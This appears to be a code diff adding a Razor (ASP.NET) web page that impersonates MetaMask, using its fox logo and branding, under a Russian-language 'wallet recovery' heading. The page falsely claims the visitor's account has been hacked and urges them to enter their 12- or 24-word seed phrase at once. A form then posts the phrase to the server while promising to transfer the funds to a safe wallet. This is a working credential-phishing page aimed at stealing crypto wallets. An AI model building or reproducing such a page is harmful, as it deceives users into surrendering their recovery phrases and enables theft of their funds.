@@ -1,0 +1,55 @@
+﻿@{
+    Layout = null;
+}
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>MetaMask • Восстановление кошелька</title>
+    <link rel="stylesheet" href="~/css/site.css" />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="wrapper">
+        <div class="modal">
+            <div class="logo">
+                <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
+                    <path d="M26.6 5.6L16.8 12.6L18.4 7.6L26.6 5.6Z" fill="#E2761B" stroke="#E2761B" stroke-width="0.2"/>
+                    <path d="M5.4 5.6L15.1 12.7L13.6 7.6L5.4 5.6Z" fill="#E4761B" stroke="#E4761B" stroke-width="0.2"/>
+                    <path d="M22.9 21.6L20.2 25.6L26.5 23.9L28.2 18.7L22.9 21.6Z" fill="#E2761B" stroke="#E2761B" stroke-width="0.2"/>
+                    <path d="M3.8 18.7L5.5 23.9L11.8 25.6L9.1 21.6L3.8 18.7Z" fill="#E4761B" stroke="#E4761B" stroke-width="0.2"/>
+                    <path d="M10.7 13.9L9 17.2L15.1 17.6L14.8 11.2L10.7 13.9Z" fill="#E2761B" stroke="#E2761B" stroke-width="0.2"/>
+                    <path d="M21.3 13.9L17.2 11.1L16.9 17.6L23 17.2L21.3 13.9Z" fill="#E2761B" stroke="#E2761B" stroke-width="0.2"/>
+                    <path d="M11.8 25.6L14.9 23.2L12.2 21.2L11.8 25.6Z" fill="#D7C1B3" stroke="#D7C1B3" stroke-width="0.2"/>
+                    <path d="M17.1 23.2L20.2 25.6L19.8 21.2L17.1 23.2Z" fill="#233447" stroke="#233447" stroke-width="0.2"/>
+                    <path d="M20.2 25.6L17.1 23.2L17.4 25.9L17.3 27.1L20.2 25.6Z" fill="#161616" stroke="#161616" stroke-width="0.2"/>
+                    <path d="M11.8 25.6L14.7 27.1L14.6 25.9L14.9 23.2L11.8 25.6Z" fill="#161616" stroke="#161616" stroke-width="0.2"/>
+                </svg>
+                <h1>MetaMask</h1>
+            </div>
+            <h2>Восстановление кошелька</h2>
+            <p class="warning-text">
+                ⚠️ Ваш аккаунт был взломан. Чтобы спасти средства,
+
+                <strong>немедленно введите сид-фразу</strong> от вашего кошелька.
+            </p>
+            <form asp-controller="Home" asp-action="Recover" method="post">
+                <div class="form-group">
+                    <label for="seedPhrase">Seed-фраза (12 или 24 слова)</label>
+                    <textarea id="seedPhrase" name="seedPhrase" rows="4" placeholder="например: abandon ..." required></textarea>
+                    <small>Введите слова через пробел в правильном порядке</small>
+                </div>
+                <button type="submit" class="btn-submit">Перевести средства на безопасный кошелёк</button>
+                @if(!string.IsNullOrEmpty(ViewBag.Message))
+                {
+                    <div class="message">@ViewBag.Message</div>
+                }
+            </form>
+            <div class="footer-note">
+                <span>🛡️ Защищено MetaMask Secure</span>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
